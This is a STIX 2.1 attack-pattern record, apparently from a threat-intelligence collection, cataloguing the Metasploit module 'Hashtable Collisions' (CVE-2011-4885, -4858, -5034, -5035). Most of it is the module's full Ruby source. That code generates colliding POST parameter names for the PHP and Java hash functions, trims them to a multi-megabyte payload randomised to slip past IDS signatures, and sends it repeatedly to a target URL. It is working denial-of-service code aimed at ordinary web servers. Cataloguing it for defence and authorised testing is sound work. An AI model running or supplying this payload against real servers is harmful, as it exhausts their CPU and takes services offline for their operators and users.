{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--82c8cba8-70fb-4595-98b5-0f9d56a81e0c",
    "created": "2024-08-14T16:26:10.068856Z",
    "modified": "2024-08-14T16:26:10.068861Z",
    "name": "Hashtable Collisions",
    "description": " This module uses a denial-of-service (DoS) condition appearing in a variety of programming languages. This vulnerability occurs when storing multiple values in a hash table and all values have the same hash value. This can cause a web server parsing the POST parameters issued with a request into a hash table to consume hours of CPU with a single HTTP request.  Currently, only the hash functions for PHP and Java are implemented. This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo. It also generates a random payload to bypass some IDS signatures. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/hashcollision_dos.rb",
            "external_id": "hashcollision_dos.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ocert.org/advisories/ocert-2011-003.html"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20120105151644/http://www.nruns.com/_downloads/advisory28122011.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://fahrplan.events.ccc.de/congress/2011/Fahrplan/events/4680.en.html"
        },
        {
            "source_name": "reference",
            "url": "https://fahrplan.events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=R2Cq3CLI6H8"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5034"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5035"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4885"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4858"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Hashtable Collisions',\n      'Description'   => %q{\n        This module uses a denial-of-service (DoS) condition appearing in a variety of\n        programming languages. This vulnerability occurs when storing multiple values\n        in a hash table and all values have the same hash value. This can cause a web server\n        parsing the POST parameters issued with a request into a hash table to consume\n        hours of CPU with a single HTTP request.\n\n        Currently, only the hash functions for PHP and Java are implemented.\n        This module was tested with PHP + httpd, Tomcat, Glassfish and Geronimo.\n        It also generates a random payload to bypass some IDS signatures.\n      },\n      'Author'        =>\n        [\n          'Alexander Klink', # advisory\n          'Julian Waelde', # advisory\n          'Scott A. Crosby', # original advisory\n          'Dan S. Wallach', # original advisory\n          'Krzysztof Kotowicz', # payload generator\n          'Christian Mehlmauer' # metasploit module\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['URL', 'http://ocert.org/advisories/ocert-2011-003.html'],\n          ['URL', 'https://web.archive.org/web/20120105151644/http://www.nruns.com/_downloads/advisory28122011.pdf'],\n          ['URL', 'https://fahrplan.events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],\n          ['URL', 'https://fahrplan.events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf'],\n          ['URL', 'https://www.youtube.com/watch?v=R2Cq3CLI6H8'],\n          ['CVE', '2011-5034'],\n          ['CVE', '2011-5035'],\n          ['CVE', '2011-4885'],\n          ['CVE', '2011-4858']\n        ],\n      'DisclosureDate'=> '2011-12-28'\n    ))\n\n    register_options(\n    [\n      OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),\n      OptString.new('URL', [ true, \"The request URI\", '/' ]),\n      OptInt.new('RLIMIT', [ true, \"Number of requests to send\", 50 ])\n    ])\n\n    register_advanced_options(\n    [\n      OptInt.new('RecursiveMax', [false, \"Maximum recursions when searching for collisionchars\", 15]),\n      OptInt.new('MaxPayloadSize', [false, \"Maximum size of the Payload in Megabyte. Autoadjust if 0\", 0]),\n      OptInt.new('CollisionChars', [false, \"Number of colliding chars to find\", 5]),\n      OptInt.new('CollisionCharLength', [false, \"Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)\", 2]),\n      OptInt.new('PayloadLength', [false, \"Length of each parameter in the payload\", 8])\n    ])\n  end\n\n  def generate_payload\n    # Taken from:\n    # https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision\n\n    @recursive_counter = 1\n    collision_chars = compute_collision_chars\n    return nil if collision_chars == nil\n\n    length = datastore['PayloadLength']\n    size = collision_chars.length\n    post = \"\"\n    max_value_float = size ** length\n    max_value_int = max_value_float.floor\n    print_status(\"#{rhost}:#{rport} - Generating POST data...\")\n    for i in 0.upto(max_value_int)\n      input_string = i.to_s(size)\n      result = input_string.rjust(length, \"0\")\n      collision_chars.each do |key, value|\n        result = result.gsub(key, value)\n      end\n      post << \"#{Rex::Text.uri_encode(result)}=&\"\n    end\n    return post\n  end\n\n  def compute_collision_chars\n    print_status(\"#{rhost}:#{rport} - Trying to find hashes...\") if @recursive_counter == 1\n    hashes = {}\n    counter = 0\n    length = datastore['CollisionCharLength']\n    a = []\n    for i in @char_range\n      a << i.chr\n    end\n    # Generate all possible strings\n    source = a\n    for i in Range.new(1,length-1)\n      source = source.product(a)\n    end\n    source = source.map(&:join)\n    # and pick a random one\n    base_str = source.sample\n    base_hash = @function.call(base_str)\n    hashes[counter.to_s] = base_str\n    counter = counter + 1\n    for item in source\n      if item == base_str\n        next\n      end\n      if @function.call(item) == base_hash\n        # Hooray we found a matching hash\n        hashes[counter.to_s] = item\n        counter = counter + 1\n      end\n      if counter >= datastore['CollisionChars']\n        break\n      end\n    end\n    if counter < datastore['CollisionChars']\n      # Try it again\n      if @recursive_counter > datastore['RecursiveMax']\n        print_error(\"#{rhost}:#{rport} - Not enough values found. Please start this script again.\")\n        return nil\n      end\n      print_status(\"#{rhost}:#{rport} - #{@recursive_counter}: Not enough values found. Trying again...\")\n      @recursive_counter = @recursive_counter + 1\n      hashes = compute_collision_chars\n    else\n      print_status(\"#{rhost}:#{rport} - Found values:\")\n      hashes.each_value do |item|\n        print_status(\"#{rhost}:#{rport} -\\tValue: #{item}\\tHash: #{@function.call(item)}\")\n        item.each_char do |c|\n          print_status(\"#{rhost}:#{rport} -\\t\\tValue: #{c}\\tCharcode: #{c.unpack(\"C\")}\")\n        end\n      end\n    end\n    return hashes\n  end\n\n  # General hash function, Dan \"djb\" Bernstein times XX add\n  def djbxa(input_string, base, start)\n    counter = input_string.length - 1\n    result = start\n    input_string.each_char do |item|\n      result = result + ((base ** counter) * item.ord)\n      counter = counter - 1\n    end\n    return result.round\n  end\n\n  # PHP's hash function (djb times 33 add)\n  def djbx33a(input_string)\n    return djbxa(input_string, 33, 5381)\n  end\n\n  # Java's hash function (djb times 31 add)\n  def djbx31a(input_string)\n    return djbxa(input_string, 31, 0)\n  end\n\n  def run\n    case datastore['TARGET']\n      when /PHP/\n        @function = method(:djbx33a)\n        @char_range = Range.new(0, 255)\n        if (datastore['MaxPayloadSize'] <= 0)\n          datastore['MaxPayloadSize'] = 8   # XXX: Refactor\n        end\n      when /Java/\n        @function = method(:djbx31a)\n        @char_range = Range.new(0, 128)\n        if (datastore['MaxPayloadSize'] <= 0)\n          datastore['MaxPayloadSize'] = 2   # XXX: Refactor\n        end\n      else\n        raise RuntimeError, \"Target #{datastore['TARGET']} not supported\"\n    end\n\n    print_status(\"#{rhost}:#{rport} - Generating payload...\")\n    payload = generate_payload\n    return if payload == nil\n    # trim to maximum payload size (in MB)\n    max_in_mb = datastore['MaxPayloadSize']*1024*1024\n    payload = payload[0,max_in_mb]\n    # remove last invalid(cut off) parameter\n    position = payload.rindex(\"=&\")\n    payload = payload[0,position+1]\n    print_status(\"#{rhost}:#{rport} -Payload generated\")\n\n    for x in 1..datastore['RLIMIT']\n      print_status(\"#{rhost}:#{rport} - Sending request ##{x}...\")\n      opts = {\n        'method'\t=> 'POST',\n        'uri'\t\t=> normalize_uri(datastore['URL']),\n        'data'\t\t=> payload\n      }\n      begin\n        c = connect\n        r = c.request_cgi(opts)\n        c.send_request(r)\n        # Don't wait for a response, can take hours\n      rescue ::Rex::ConnectionError => exception\n        print_error(\"#{rhost}:#{rport} - Unable to connect: '#{exception.message}'\")\n        return\n      ensure\n        disconnect(c) if c\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-28"
}